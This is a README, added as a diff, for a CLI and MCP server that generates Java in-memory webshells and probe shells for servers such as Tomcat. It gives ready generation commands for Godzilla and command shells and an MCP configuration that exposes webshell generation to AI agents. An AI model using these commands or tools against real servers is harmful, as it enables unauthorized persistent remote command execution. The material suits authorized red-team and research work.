@@ -1,0 +1,167 @@
+# memshell-party-cli
+
+Command-line client **and** MCP server for [MemShellParty](https://party.mem.mk) — generate Java
+memory shells and probe shells straight from your terminal (or from an AI agent), talking to the
+same HTTP API that powers `party.mem.mk/ui`.
+
+> ⚠️ For authorized security testing, red-team engagements, and research only. You are responsible
+> for how you use it.
+
+## Features
+
+- **Interactive wizard** — run `memparty gen` with no flags and pick server / tool / type / packer
+  from live, API-driven menus.
+- **Fully scriptable** — every option is also a flag, so generation is reproducible in CI or scripts.
+- **MCP server** — `memparty mcp` exposes generation and config as tools for Claude and other MCP clients.
+- **All endpoints** — memshell generate, probe generate, config listing, class-name parsing, version.
+- **Flexible output** — payload to stdout by default, or `-o file` (auto base64-decodes `.class`/`.jar`).
+- **Any backend** — defaults to the public site, override to your self-hosted instance.
+
+## Install
+
+```bash
+npm install -g memshell-party-cli
+# or run without installing:
+npx memshell-party-cli gen
+```
+
+Requires Node.js >= 18.
+
+## Choosing the backend
+
+By priority: `--api` flag → `MEMPARTY_API_URL` env var → `~/.mempartyrc` (`{"apiUrl": "..."}`) →
+default `https://party.mem.mk`.
+
+Self-hosting is recommended (see the MemShellParty README for the Docker one-liner):
+
+```bash
+memparty --api http://127.0.0.1:8080 gen
+# or
+export MEMPARTY_API_URL=http://127.0.0.1:8080
+```
+
+## Usage
+
+### Interactive
+
+```bash
+memparty gen        # wizard for a memory shell
+memparty probe      # wizard for a probe shell
+```
+
+The wizard launches automatically when required flags are missing and you're in a terminal.
+Force it anytime with `-i`, or disable it with `--no-interactive`.
+
+### Scripted generation
+
+```bash
+# Godzilla listener for Tomcat, single Base64 payload to stdout
+memparty gen -s Tomcat -t Godzilla -y Listener -p DefaultBase64 \
+  --godzilla-pass pass --godzilla-key key --jdk java8
+
+# Write a decoded .class file (base64 decoding is automatic for .class/.jar)
+memparty gen -s Tomcat -t Godzilla -y Listener -p DefaultBase64 \
+  --godzilla-pass pass --godzilla-key key -o shell.class
+
+# Command shell with an explicit encryptor
+memparty gen -s Tomcat -t Command -y Filter -p DefaultBase64 \
+  --command-param-name cmd --encryptor RAW --implementation-class RuntimeExec
+
+# Full JSON response (metadata + payload) for further processing
+memparty gen -s Tomcat -t Godzilla -y Listener -p DefaultBase64 --json
+```
+
+`--jdk` accepts `java6/8/9/11/17/21`, a bare number (`8`), or a raw class-file major version (`52`).
+
+Note: some packers (e.g. `Base64`) are *aggregate* packers and return several variants at once;
+pick a leaf packer (e.g. `DefaultBase64`, `GzipBase64`) for a single payload.
+
+### Discovering options
+
+```bash
+memparty config servers          # servers and their shell types
+memparty config tools Tomcat     # tools + types for one server
+memparty config packers          # packer parent/child tree
+memparty config command          # Command encryptors & implementation classes
+memparty config servers --json   # machine-readable
+```
+
+### Probe shells
+
+```bash
+memparty probe -m ResponseBody -c Command -p DefaultBase64 --server Tomcat --req-param-name cmd
+memparty probe -m Sleep -c Server -p DefaultBase64 --sleep-server Tomcat --seconds 5
+```
+
+### Parse a class name
+
+```bash
+memparty parse-classname --file shell.class
+memparty parse-classname <base64-of-class-bytes>
+```
+
+### Version
+
+```bash
+memparty version          # CLI version + backend server version
+```
+
+## MCP server
+
+Run the CLI as an MCP server over stdio:
+
+```bash
+memparty mcp --api http://127.0.0.1:8080
+```
+
+Example Claude Code / Claude Desktop config:
+
+```json
+{
+  "mcpServers": {
+    "memshell-party": {
+      "command": "npx",
+      "args": ["-y", "memshell-party-cli", "mcp"],
+      "env": { "MEMPARTY_API_URL": "http://127.0.0.1:8080" }
+    }
+  }
+}
+```
+
+Exposed tools: `list_servers`, `list_config`, `list_packers`, `list_command_configs`,
+`generate_memshell`, `generate_probe`, `parse_classname`, `server_version`.
+
+## Programmatic use
+
+The package also ships a typed API client:
+
+```ts
+import { MemPartyClient, buildMemShellRequest } from "memshell-party-cli";
+
+const client = new MemPartyClient({ baseUrl: "http://127.0.0.1:8080" });
+const res = await client.generateMemShell(
+  buildMemShellRequest({
+    server: "Tomcat",
+    shellTool: "Godzilla",
+    shellType: "Listener",
+    packer: "DefaultBase64",
+    godzillaPass: "pass",
+    godzillaKey: "key",
+    jdk: "java8",
+  }),
+);
+console.log(res.memShellResult.shellClassName, res.packResult);
+```
+
+## Development
+
+```bash
+npm install
+npm run build       # tsup -> dist/
+npm test            # vitest
+npm run typecheck   # tsc --noEmit
+```
+
+## License
+
+MIT
